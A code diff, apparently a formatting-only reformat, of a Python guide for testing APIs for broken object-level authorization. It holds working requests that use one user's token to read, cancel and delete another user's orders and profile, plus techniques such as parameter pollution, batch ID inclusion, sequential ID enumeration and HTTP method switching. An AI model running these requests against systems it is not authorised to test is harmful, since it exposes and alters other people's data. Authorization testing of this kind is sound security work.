@@ -143,49 +143,53 @@ results = []
 
 # Test 1: Access User B's profile with User A's token
 resp = requests.get(f"{BASE_URL}/users/{user_b_id}", headers=user_a_headers)
-results.append({
-    "test": "Access other user profile",
-    "endpoint": f"GET /users/{user_b_id}",
-    "auth": "User A",
-    "status": resp.status_code,
-    "vulnerable": resp.status_code == 200,
-    "data_leaked": list(resp.json().keys()) if resp.status_code == 200 else None
-})
+results.append(
+    {
+        "test": "Access other user profile",
+        "endpoint": f"GET /users/{user_b_id}",
+        "auth": "User A",
+        "status": resp.status_code,
+        "vulnerable": resp.status_code == 200,
+        "data_leaked": list(resp.json().keys()) if resp.status_code == 200 else None,
+    }
+)
 
 # Test 2: Access User B's orders with User A's token
 for order_id in user_b_order_ids:
     resp = requests.get(f"{BASE_URL}/orders/{order_id}", headers=user_a_headers)
-    results.append({
-        "test": f"Access other user order {order_id}",
-        "endpoint": f"GET /orders/{order_id}",
-        "auth": "User A",
-        "status": resp.status_code,
-        "vulnerable": resp.status_code == 200
-    })
+    results.append(
+        {
+            "test": f"Access other user order {order_id}",
+            "endpoint": f"GET /orders/{order_id}",
+            "auth": "User A",
+            "status": resp.status_code,
+            "vulnerable": resp.status_code == 200,
+        }
+    )
 
 # Test 3: Modify User B's order with User A's token
-resp = requests.patch(
-    f"{BASE_URL}/orders/{user_b_order_ids[0]}",
-    headers=user_a_headers,
-    json={"status": "cancelled"}
+resp = requests.patch(f"{BASE_URL}/orders/{user_b_order_ids[0]}", headers=user_a_headers, json={"status": "cancelled"})
+results.append(
+    {
+        "test": "Modify other user order",
+        "endpoint": f"PATCH /orders/{user_b_order_ids[0]}",
+        "auth": "User A",
+        "status": resp.status_code,
+        "vulnerable": resp.status_code in (200, 204),
+    }
 )
-results.append({
-    "test": "Modify other user order",
-    "endpoint": f"PATCH /orders/{user_b_order_ids[0]}",
-    "auth": "User A",
-    "status": resp.status_code,
-    "vulnerable": resp.status_code in (200, 204)
-})
 
 # Test 4: Delete User B's resource with User A's token
 resp = requests.delete(f"{BASE_URL}/orders/{user_b_order_ids[0]}", headers=user_a_headers)
-results.append({
-    "test": "Delete other user order",
-    "endpoint": f"DELETE /orders/{user_b_order_ids[0]}",
-    "auth": "User A",
-    "status": resp.status_code,
-    "vulnerable": resp.status_code in (200, 204)
-})
+results.append(
+    {
+        "test": "Delete other user order",
+        "endpoint": f"DELETE /orders/{user_b_order_ids[0]}",
+        "auth": "User A",
+        "status": resp.status_code,
+        "vulnerable": resp.status_code in (200, 204),
+    }
+)
 
 # Print results
 for r in results:
@@ -199,27 +203,18 @@ Test for less obvious BOLA patterns:
 
 ```python
 # Technique 1: Parameter pollution - send both IDs
-resp = requests.get(
-    f"{BASE_URL}/orders/{user_a_order_ids[0]}?order_id={user_b_order_ids[0]}",
-    headers=user_a_headers
-)
+resp = requests.get(f"{BASE_URL}/orders/{user_a_order_ids[0]}?order_id={user_b_order_ids[0]}", headers=user_a_headers)
 print(f"Parameter pollution: {resp.status_code}")
 
 # Technique 2: JSON body object ID override
-resp = requests.post(
-    f"{BASE_URL}/orders/details",
-    headers=user_a_headers,
-    json={"order_id": user_b_order_ids[0]}
-)
+resp = requests.post(f"{BASE_URL}/orders/details", headers=user_a_headers, json={"order_id": user_b_order_ids[0]})
 print(f"Body ID override: {resp.status_code}")
 
 # Technique 3: Array of IDs - include other user's IDs in batch request
 resp = requests.post(
-    f"{BASE_URL}/orders/batch",
-    headers=user_a_headers,
-    json={"order_ids": user_a_order_ids + user_b_order_ids}
+    f"{BASE_URL}/orders/batch", headers=user_a_headers, json={"order_ids": user_a_order_ids + user_b_order_ids}
 )
-print(f"Batch ID inclusion: {resp.status_code}, returned {len(resp.json().get('orders',[]))} orders")
+print(f"Batch ID inclusion: {resp.status_code}, returned {len(resp.json().get('orders', []))} orders")
 
 # Technique 4: Numeric ID manipulation for sequential IDs
 for offset in range(-5, 6):
@@ -232,19 +227,16 @@ for offset in range(-5, 6):
                 print(f"BOLA: Order {test_id} belongs to user {owner}, accessible by User A")
 
 # Technique 5: Swap object ID in nested resource paths
-resp = requests.get(
-    f"{BASE_URL}/users/{user_b_id}/orders/{user_b_order_ids[0]}/invoice",
-    headers=user_a_headers
-)
+resp = requests.get(f"{BASE_URL}/users/{user_b_id}/orders/{user_b_order_ids[0]}/invoice", headers=user_a_headers)
 print(f"Nested resource BOLA: {resp.status_code}")
 
 # Technique 6: Method switching - GET may be blocked but PUT allowed
-for method in ['GET', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']:
+for method in ["GET", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]:
     resp = requests.request(
         method,
         f"{BASE_URL}/users/{user_b_id}/settings",
         headers=user_a_headers,
-        json={"notifications": False} if method in ('PUT', 'PATCH') else None
+        json={"notifications": False} if method in ("PUT", "PATCH") else None,
     )
     if resp.status_code not in (401, 403, 405):
         print(f"Method {method} on other user settings: {resp.status_code}")
